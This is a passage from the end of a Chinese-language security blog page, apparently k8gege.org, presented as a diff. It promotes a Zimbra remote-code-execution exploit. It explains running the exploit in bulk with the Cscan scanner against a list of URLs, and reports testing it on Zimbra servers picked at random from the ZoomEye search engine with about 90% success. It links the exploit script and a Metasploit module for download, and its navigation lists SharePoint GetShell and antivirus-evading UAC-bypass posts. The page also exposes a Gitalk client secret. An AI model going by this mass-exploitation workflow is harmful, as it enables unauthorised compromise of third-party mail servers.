+</div>
+<p>&nbsp;</p>
+<p><strong><span style="font-size: 16px;">配合Cscan使用(批量使用url.txt) </span><br></strong></p>
+<p>Cscan.ini配置如下</p>
+<p><img alt="" data-original="http://k8gege.org/k8img/posts/zimbra1.png"></p>
+<p><img alt="" data-original="http://k8gege.org/k8img/posts/zimbra2.png"></p>
+<p>Cscan扫禁ping机器需加nocheck参数</p>
+<p><img alt="" data-original="http://k8gege.org/k8img/posts/zimbra3.png"></p>
+<p><strong><span style="font-size: 16px;">钟馗之眼随便抓一些Zimbra来测试，发现成功率高达90%</span></strong></p>
+<p><img alt="" data-original="http://k8gege.org/k8img/posts/zimbra4.png"></p>
+<p>&nbsp;</p>
+<p><strong>下载</strong></p>
+<p>EXP: <a href="https://github.com/k8gege/K8tools/blob/master/Zimbra_Rce.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/Zimbra_Rce.py</a></p>
+<p>Cscan: <a href="https://www.cnblogs.com/k8gege/p/10519321.html" target="_blank">https://www.cnblogs.com/k8gege/p/10519321.html</a></p>
+<p>MSF:&nbsp;&nbsp;<a href="https://github.com/k8gege/ZimbraExploit" target="_blank"> https://github.com/k8gege/ZimbraExploit</a></p>
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/e896a7d1.html" class="pre-post btn btn-default" title="CVE-2019-0604 SharePoint GetShell Exploit">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            CVE-2019-0604 SharePoint GetShell Exploit</span>
+    </a>
+    
+    
+    <a href="/p/41e1c61c.html" class="next-post btn btn-default" title="K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">漏洞描述：</span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">SSRF+Get Admin_Token Stage</span></a>
+        
+    </li></div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
